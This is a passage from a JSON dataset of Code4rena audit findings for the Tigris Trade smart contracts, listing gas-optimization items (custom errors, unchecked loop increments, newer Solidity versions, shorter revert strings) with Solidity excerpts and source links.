onlyMinter {\n\n260:      function burn(uint _id) external onlyMinter {\n\n310:      function setMinter(address _minter, bool _bool) external onlyOwner {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Position.sol#L85\n\n```solidity\nFile: contracts/Referrals.sol\n\n32:       function setReferred(address _referredTrader, bytes32 _hash) external onlyProtocol {\n\n53:       function setProtocol(address _protocol) external onlyOwner {\n\n60        function initRefs(\n61            address[] memory _codeOwners,\n62            bytes32[] memory _ownedCodes,\n63            address[] memory _referredA,\n64            bytes32[] memory _referredTo\n65:       ) external onlyOwner {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Referrals.sol#L32\n\n```solidity\nFile: contracts/StableToken.sol\n\n13        function burnFrom(\n14            address account,\n15            uint256 amount\n16        ) \n17            public \n18            virtual \n19:           onlyMinter() \n\n24        function mintFor(\n25            address account,\n26            uint256 amount\n27        ) \n28            public \n29            virtual \n30:           onlyMinter() \n\n38        function setMinter(\n39            address _address,\n40            bool _status\n41        ) \n42            public\n43:           onlyOwner()\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/StableToken.sol#L13-L19\n\n```solidity\nFile: contracts/StableVault.sol\n\n78:       function listToken(address _token) external onlyOwner {\n\n89:       function delistToken(address _token) external onlyOwner {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/StableVault.sol#L78\n\n```solidity\nFile: contracts/TradingExtension.sol\n\n61        function _closePosition(\n62            uint _id,\n63            uint _price,\n64            uint _percent\n65:       ) external onlyProtocol returns (IPosition.Trade memory _trade, uint256 _positionSize, int256 _payout) {\n\n126       function modifyShortOi(\n127           uint _asset,\n128           address _tigAsset,\n129           bool _onOpen,\n130           uint _size\n131:      ) public onlyProtocol {\n\n135       function modifyLongOi(\n136           uint _asset,\n137           address _tigAsset,\n138           bool _onOpen,\n139           uint _size\n140:      ) public onlyProtocol {\n\n144:      function setMaxGasPrice(uint _maxGasPrice) external onlyOwner {\n\n190       function _setReferral(\n191           bytes32 _referral,\n192           address _trader\n193:      ) external onlyProtocol {\n\n222       function setValidSignatureTimer(\n223           uint _validSignatureTimer\n224       )\n225           external\n226:          onlyOwner\n\n231:      function setChainlinkEnabled(bool _bool) external onlyOwner {\n\n240:      function setNode(address _node, bool _bool) external onlyOwner {\n\n249       function setAllowedMargin(\n250           address _tigAsset,\n251           bool _bool\n252       ) \n253           external\n254:          onlyOwner\n\n264       function setMinPositionSize(\n265           address _tigAsset,\n266           uint _min\n267       ) \n268           external\n269:          onlyOwner\n\n274:      function setPaused(bool _paused) external onlyOwner {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/TradingExtension.sol#L61-L65\n\n```solidity\nFile: contracts/Trading.sol\n\n898       function setBlockDelay(\n899           uint _blockDelay\n900       )\n901           external\n902:          onlyOwner\n\n912       function setAllowedVault(\n913           address _stableVault,\n914           bool _bool\n915       )\n916           external\n917:          onlyOwner\n\n926       function setMaxWinPercent(\n927           uint _maxWinPercent\n928       )\n929           external\n930:          onlyOwner\n\n939:      function setLimitOrderPriceRange(uint _range) external onlyOwner {\n\n952:      function setFees(bool _open, uint _daoFees, uint _burnFees, uint _referralFees, uint _botFees, uint _percent) external onlyOwner {\n\n975       function setTradingExtension(\n976           address _ext\n977:      ) external onlyOwner() {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Trading.sol#L898-L902\n\n```solidity\nFile: contracts/utils/MetaContext.sol\n\n9:        function setTrustedForwarder(address _forwarder, bool _bool) external onlyOwner {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/utils/MetaContext.sol#L9\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43213",
      "title": "[G-20]  Use custom errors rather than `revert()`/`require()` strings to save gas",
      "impact": "GAS",
      "content": "Custom errors are available from solidity version 0.8.4. Custom errors save [**~50 gas**](https://gist.github.com/IllIllI000/ad1bd0d29a0101b25e57c293b4b0c746) each time they're hit by [avoiding having to allocate and store the revert string](https://blog.soliditylang.org/2021/04/21/custom-errors/#errors-in-depth). Not defining the strings also save deployment gas\n\n*There are 2 instances of this issue:*\n\n```solidity\nFile: contracts/GovNFT.sol\n\n153           require(\n154               msg.value >= messageFee,\n155               \"Must send enough value to cover messageFee\"\n156:          );\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L153-L156\n\n```solidity\nFile: contracts/utils/TradingLibrary.sol\n\n116                   require(\n117                       _priceData.price < assetChainlinkPrice+assetChainlinkPrice*2/100 &&\n118                       _priceData.price > assetChainlinkPrice-assetChainlinkPrice*2/100, \"!chainlinkPrice\"\n119:                  );\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/utils/TradingLibrary.sol#L116-L119\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43212",
      "title": "[G-19]  `require()` or `revert()` statements that check input arguments should be at the top of the function",
      "impact": "GAS",
      "content": "Checks that involve constants should come before checks that involve state variables, function calls, and calculations. By doing these checks first, the function is able to revert before wasting a Gcoldsload (**2100 gas***) in a function that may ultimately revert in the unhappy case.\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/GovNFT.sol\n\n/// @audit expensive op on line 65\n66:           require(tokenId <= 10000, \"BadID\");\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L66\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43211",
      "title": "[G-18]  Ternary unnecessary",
      "impact": "GAS",
      "content": "`z = (x == y) ? true : false` => `z = (x == y)`\n\n*There are 2 instances of this issue:*\n\n```solidity\nFile: contracts/BondNFT.sol\n\n238:          bond.expired = bond.expireEpoch <= epoch[bond.asset] ? true : false;\n\n252:          return bond.expireEpoch <= epoch[bond.asset] ? true : false;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L238\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43210",
      "title": "[G-17]  Don't compare boolean expressions to boolean literals",
      "impact": "GAS",
      "content": "`if (<x> == true)` => `if (<x>)`, `if (<x> == false)` => `if (!<x>)`\n\n*There are 2 instances of this issue:*\n\n```solidity\nFile: contracts/BondNFT.sol\n\n238:          bond.expired = bond.expireEpoch <= epoch[bond.asset] ? true : false;\n\n252:          return bond.expireEpoch <= epoch[bond.asset] ? true : false;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L238\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43209",
      "title": "[G-16]  Splitting `require()` statements that use `&&` saves gas",
      "impact": "GAS",
      "content": "See [this issue](https://github.com/code-423n4/2022-01-xdefi-findings/issues/128) which describes the fact that there is a larger deployment gas cost, but with enough runtime calls, the change ends up being cheaper by **3 gas**\n\n*There are 3 instances of this issue:*\n\n```solidity\nFile: contracts/PairsContract.sol\n\n52:           require(_maxLeverage >= _minLeverage && _minLeverage > 0, \"Wrong leverage values\");\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/PairsContract.sol#L52\n\n```solidity\nFile: contracts/Trading.sol\n\n887:              require(_proxy.proxy == _msgSender() && _proxy.time >= block.timestamp, \"Proxy not approved\");\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Trading.sol#L887\n\n```solidity\nFile: contracts/utils/TradingLibrary.sol\n\n116                   require(\n117                       _priceData.price < assetChainlinkPrice+assetChainlinkPrice*2/100 &&\n118                       _priceData.price > assetChainlinkPrice-assetChainlinkPrice*2/100, \"!chainlinkPrice\"\n119:                  );\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/utils/TradingLibrary.sol#L116-L119\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43208",
      "title": "[G-15]  Use a more recent version of solidity",
      "impact": "GAS",
      "content": "Use a solidity version of at least 0.8.2 to get simple compiler automatic inlining\n\nUse a solidity version of at least 0.8.3 to get better struct packing and cheaper multiple storage reads\n\nUse a solidity version of at least 0.8.4 to get custom errors, which are cheaper at deployment than `revert()/require()` strings\n\nUse a solidity version of at least 0.8.10 to have external calls skip contract existence checks if the external call has a return value\n\n*There are 21 instances of this issue:*\n\n```solidity\nFile: contracts/BondNFT.sol\n\n2:    pragma solidity ^0.8.0;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L2\n\n```solidity\nFile: contracts/GovNFT.sol\n\n2:    pragma solidity ^0.8.0;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L2\n\n```solidity\nFile: contracts/interfaces/IGovNFT.sol\n\n3:    pragma solidity ^0.8.0;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/interfaces/IGovNFT.sol#L3\n\n```solidity\nFile: contracts/interfaces/ILayerZeroEndpoint.sol\n\n3:    pragma solidity ^0.8.0;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/interfaces/ILayerZeroEndpoint.sol#L3\n\n```solidity\nFile: contracts/interfaces/ILayerZeroReceiver.sol\n\n3:    pragma solidity ^0.8.0;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/interfaces/ILayerZeroReceiver.sol#L3\n\n```solidity\nFile: contracts/interfaces/ILayerZeroUserApplicationConfig.sol\n\n3:    pragma solidity ^0.8.0;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/interfaces/ILayerZeroUserApplicationConfig.sol#L3\n\n```solidity\nFile: contracts/interfaces/IPairsContract.sol\n\n3:    pragma solidity ^0.8.0;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/interfaces/IPairsContract.sol#L3\n\n```solidity\nFile: contracts/interfaces/IPosition.sol\n\n3:    pragma solidity ^0.8.0;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/interfaces/IPosition.sol#L3\n\n```solidity\nFile: contracts/interfaces/IReferrals.sol\n\n3:    pragma solidity ^0.8.0;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/interfaces/IReferrals.sol#L3\n\n```solidity\nFile: contracts/interfaces/IStableVault.sol\n\n3:    pragma solidity ^0.8.0;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/interfaces/IStableVault.sol#L3\n\n```solidity\nFile: contracts/interfaces/ITrading.sol\n\n5:    pragma solidity ^0.8.0;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/interfaces/ITrading.sol#L5\n\n```solidity\nFile: contracts/Lock.sol\n\n2:    pragma solidity ^0.8.0;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L2\n\n```solidity\nFile: contracts/PairsContract.sol\n\n2:    pragma solidity ^0.8.0;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/PairsContract.sol#L2\n\n```solidity\nFile: contracts/Position.sol\n\n2:    pragma solidity ^0.8.0;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Position.sol#L2\n\n```solidity\nFile: contracts/Referrals.sol\n\n2:    pragma solidity ^0.8.0;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Referrals.sol#L2\n\n```solidity\nFile: contracts/StableToken.sol\n\n2:    pragma solidity ^0.8.0;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/StableToken.sol#L2\n\n```solidity\nFile: contracts/StableVault.sol\n\n2:    pragma solidity ^0.8.0;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/StableVault.sol#L2\n\n```solidity\nFile: contracts/TradingExtension.sol\n\n2:    pragma solidity ^0.8.0;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/TradingExtension.sol#L2\n\n```solidity\nFile: contracts/Trading.sol\n\n2:    pragma solidity ^0.8.0;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Trading.sol#L2\n\n```solidity\nFile: contracts/utils/MetaContext.sol\n\n2:    pragma solidity ^0.8.0;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/utils/MetaContext.sol#L2\n\n```solidity\nFile: contracts/utils/TradingLibrary.sol\n\n2:    pragma solidity ^0.8.0;\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/utils/TradingLibrary.sol#L2\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43207",
      "title": "[G-14]  Optimize names to save gas",
      "impact": "GAS",
      "content": "`public`/`external` function names and `public` member variable names can be optimized to save gas. See [this](https://gist.github.com/IllIllI000/a5d8b486a8259f9f77891a919febd1a9) link for an example of how it works. Below are the interfaces/abstract contracts that can be optimized so that the most frequently-called functions use the least amount of gas possible during method lookup. Method IDs that have two leading zero bytes can save **128 gas** each during deployment, and renaming functions to have lower method IDs will save **22 gas** per call, [per sorted position shifted](https://medium.com/joyso/solidity-how-does-function-name-affect-gas-consumption-in-smart-contract-47d270d8ac92)\n\n*There are 25 instances of this issue:*\n\n```solidity\nFile: contracts/BondNFT.sol\n\n/// @audit createLock(), extendLock(), release(), claim(), claimDebt(), distribute(), idToBond(), isExpired(), pending(), getAssets(), safeTransferMany(), safeTransferFromMany(), approveMany(), balanceIds(), addAsset(), setAllowedAsset(), setBaseURI(), setManager()\n8:    contract BondNFT is ERC721Enumerable, Ownable {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L8\n\n```solidity\nFile: contracts/GovNFT.sol\n\n/// @audit setBaseURI(), _bridgeMint(), mintMany(), setTrustedAddress(), crossChain(), nonblockingLzReceive(), retryMessage(), estimateFees(), setGas(), setEndpoint(), safeTransferMany(), safeTransferFromMany(), approveMany(), claim(), distribute(), pending(), addAsset(), setAllowedAsset(), setMaxBridge(), assetsLength(), allowedAsset(), balanceIds()\n12:   contract GovNFT is ERC721Enumerable, ILayerZeroReceiver, MetaContext, IGovNFT {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L12\n\n```solidity\nFile: contracts/interfaces/IBondNFT.sol\n\n/// @audit createLock(), extendLock(), claim(), claimDebt(), release(), distribute(), ownerOf(), getAssets()\n4:    interface IBondNFT {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/interfaces/IBondNFT.sol#L4\n\n```solidity\nFile: contracts/interfaces/IGovNFT.sol\n\n/// @audit distribute(), safeTransferMany(), claim(), pending()\n5:    interface IGovNFT {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/interfaces/IGovNFT.sol#L5\n\n```solidity\nFile: contracts/interfaces/ILayerZeroEndpoint.sol\n\n/// @audit send(), receivePayload(), getInboundNonce(), getOutboundNonce(), estimateFees(), getChainId(), retryPayload(), hasStoredPayload(), getSendLibraryAddress(), getReceiveLibraryAddress(), isSendingPayload(), isReceivingPayload(), getConfig(), getSendVersion(), getReceiveVersion()\n7:    interface ILayerZeroEndpoint is ILayerZeroUserApplicationConfig {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/interfaces/ILayerZeroEndpoint.sol#L7\n\n```solidity\nFile: contracts/interfaces/ILayerZeroReceiver.sol\n\n/// @audit lzReceive()\n5:    interface ILayerZeroReceiver {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/interfaces/ILayerZeroReceiver.sol#L5\n\n```solidity\nFile: contracts/interfaces/ILayerZeroUserApplicationConfig.sol\n\n/// @audit setConfig(), setSendVersion(), setReceiveVersion(), forceResumeReceive()\n5:    interface ILayerZeroUserApplicationConfig {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/interfaces/ILayerZeroUserApplicationConfig.sol#L5\n\n```solidity\nFile: contracts/interfaces/IPairsContract.sol\n\n/// @audit allowedAsset(), idToAsset(), idToOi(), setAssetBaseFundingRate(), modifyLongOi(), modifyShortOi()\n5:    interface IPairsContract {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/interfaces/IPairsContract.sol#L5\n\n```solidity\nFile: contracts/interfaces/IPosition.sol\n\n/// @audit trades(), executeLimitOrder(), modifyMargin(), addToPosition(), reducePosition(), assetOpenPositions(), assetOpenPositionsIndexes(), limitOrders(), limitOrderIndexes(), assetOpenPositionsLength(), limitOrdersLength(), ownerOf(), mint(), burn(), modifyTp(), modifySl(), getCount(), updateFunding(), setAccInterest()\n5:    interface IPosition {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/interfaces/IPosition.sol#L5\n\n```solidity\nFile: contracts/interfaces/IReferrals.sol\n\n/// @audit createReferralCode(), setReferred(), getReferred(), getReferral()\n5:    interface IReferrals {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/interfaces/IReferrals.sol#L5\n\n```solidity\nFile: contracts/interfaces/IStableVault.sol\n\n/// @audit deposit(), withdraw(), allowed(), stable()\n5:    interface IStableVault {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/interfaces/IStableVault.sol#L5\n\n```solidity\nFile: contracts/interfaces/ITrading.sol\n\n/// @audit initiateMarketOrder(), initiateCloseOrder(), addMargin(), removeMargin(), addToPosition(), initiateLimitOrder(), cancelLimitOrder(), updateTpSl(), executeLimitOrder(), liquidatePosition(), limitClose()\n7:    interface ITrading {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/interfaces/ITrading.sol#L7\n\n```solidity\nFile: contracts/Lock.sol\n\n/// @audit claim(), claimDebt(), lock(), extendLock(), release(), claimGovFees(), editAsset(), sendNFTs()\n10:   contract Lock is Ownable{\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L10\n\n```solidity\nFile: contracts/PairsContract.sol\n\n/// @audit idToAsset(), idToOi(), setAssetChainlinkFeed(), addAsset(), updateAssetLeverage(), setAssetBaseFundingRate(), updateAssetFeeMultiplier(), pauseAsset(), setMaxBaseFundingRate(), setProtocol(), setMaxOi(), modifyLongOi(), modifyShortOi()\n8:    contract PairsContract is Ownable, IPairsContract {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/PairsContract.sol#L8\n\n```solidity\nFile: contracts/Position.sol\n\n/// @audit isMinter(), trades(), openPositions(), openPositionsIndexes(), assetOpenPositions(), assetOpenPositionsIndexes(), limitOrders(), limitOrderIndexes(), setBaseURI(), updateFunding(), mint(), executeLimitOrder(), modifyMargin(), addToPosition(), setAccInterest(), reducePosition(), modifyTp(), modifySl(), burn(), assetOpenPositionsLength(), limitOrdersLength(), getCount(), userTrades(), openPositionsSelection(), setMinter()\n9:    contract Position is ERC721Enumerable, MetaContext, IPosition {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Position.sol#L9\n\n```solidity\nFile: contracts/Referrals.sol\n\n/// @audit createReferralCode(), setReferred(), getReferred(), getReferral(), setProtocol(), initRefs()\n7:    contract Referrals is Ownable, IReferrals {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Referrals.sol#L7\n\n```solidity\nFile: contracts/StableToken.sol\n\n/// @audit mintFor(), setMinter()\n7:    contract StableToken is ERC20Permit, MetaContext {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/StableToken.sol#L7\n\n```solidity\nFile: contracts/StableVault.sol\n\n/// @audit mintFor()\n9:    interface IERC20Mintable is IERC20 {\n\n/// @audit deposit(), depositWithPermit(), withdraw(), listToken(), delistToken()\n27:   contract StableVault is MetaContext, IStableVault {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/StableVault.sol#L9\n\n```solidity\nFile: contracts/TradingExtension.sol\n\n/// @audit minPos(), _closePosition(), _limitClose(), _checkGas(), modifyShortOi(), modifyLongOi(), setMaxGasPrice(), getRef(), getVerifiedPrice(), _setReferral(), validateTrade(), setValidSignatureTimer(), setChainlinkEnabled(), setNode(), setAllowedMargin(), setMinPositionSize(), setPaused()\n10:   contract TradingExtension is Ownable{\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/TradingExtension.sol#L10\n\n```solidity\nFile: contracts/Trading.sol\n\n/// @audit getVerifiedPrice(), getRef(), _setReferral(), validateTrade(), isPaused(), minPos(), modifyLongOi(), modifyShortOi(), _limitClose(), _checkGas(), _closePosition()\n14:   interface ITradingExtension {\n\n/// @audit burnFrom(), mintFor()\n58:   interface IStable is IERC20 {\n\n/// @audit initiateMarketOrder(), initiateCloseOrder(), addToPosition(), initiateLimitOrder(), cancelLimitOrder(), addMargin(), removeMargin(), updateTpSl(), executeLimitOrder(), liquidatePosition(), limitClose(), approveProxy(), setBlockDelay(), setAllowedVault(), setMaxWinPercent(), setLimitOrderPriceRange(), setFees(), setTradingExtension()\n79:   contract Trading is MetaContext, ITrading {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Trading.sol#L14\n\n```solidity\nFile: contracts/utils/MetaContext.sol\n\n/// @audit setTrustedForwarder(), isTrustedForwarder()\n6:    contract MetaContext is Ownable {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/utils/MetaContext.sol#L6\n\n```solidity\nFile: contracts/utils/TradingLibrary.sol\n\n/// @audit pnl(), liqPrice(), getLiqPrice(), verifyPrice()\n21:   library TradingLibrary {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/utils/TradingLibrary.sol#L21\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43206",
      "title": "[G-13]  `require()`/`revert()` strings longer than 32 bytes cost extra gas",
      "impact": "GAS",
      "content": "Each extra memory word of bytes past the original 32 [incurs an MSTORE](https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#consider-having-short-revert-strings) which costs **3 gas**\n\n*There are 4 instances of this issue:*\n\n```solidity\nFile: contracts/GovNFT.sol\n\n153           require(\n154               msg.value >= messageFee,\n155               \"Must send enough value to cover messageFee\"\n156:          );\n\n185:          require(msg.sender == address(this), \"NonblockingLzApp: caller must be app\");\n\n209:          require(payloadHash != bytes32(0), \"NonblockingLzApp: no stored message\");\n\n210:          require(keccak256(_payload) == payloadHash, \"NonblockingLzApp: invalid payload\");\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L153-L156\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43205",
      "title": "[G-12]  `++i`/`i++` should be `unchecked{++i}`/`unchecked{i++}` when it is not possible for them to overflow, as is the case when used in `for`- and `while`-loops",
      "impact": "GAS",
      "content": "The `unchecked` keyword is new in solidity version 0.8.0, so this only applies to that version or higher, which these instances are. This saves **30-40 gas [per loop](https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#the-increment-in-for-loop-post-condition-can-be-made-unchecked)**\n\n*There are 16 instances of this issue:*\n\n```solidity\nFile: contracts/GovNFT.sol\n\n53:           for (uint i=0; i<assetsLength(); i++) {\n\n67:           for (uint i=0; i<assetsLength(); i++) {\n\n78:           for (uint i=0; i<assetsLength(); i++) {\n\n95:           for (uint i=0; i<assetsLength(); i++) {\n\n105:          for (uint i=0; i<_amount; i++) {\n\n131:          for (uint i=0; i<tokenId.length; i++) {\n\n200:          for (uint i=0; i<tokenId.length; i++) {\n\n246:          for (uint i=0; i<_ids.length; i++) {\n\n252:          for (uint i=0; i<_ids.length; i++) {\n\n258:          for (uint i=0; i<_ids.length; i++) {\n\n325:          for (uint i=0; i<_ids.length; i++) {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L53\n\n```solidity\nFile: contracts/Lock.sol\n\n113:          for (uint i=0; i < assets.length; i++) {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L113\n\n```solidity\nFile: contracts/Position.sol\n\n296:          for (uint i=0; i<_ids.length; i++) {\n\n304:          for (uint i=0; i<_ids.length; i++) {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Position.sol#L296\n\n```solidity\nFile: contracts/Referrals.sol\n\n70:           for (uint i=0; i<_codeOwnersL; i++) {\n\n73:           for (uint i=0; i<_referredAL; i++) {\n\n```\nhttps:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Referrals.sol#L70\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
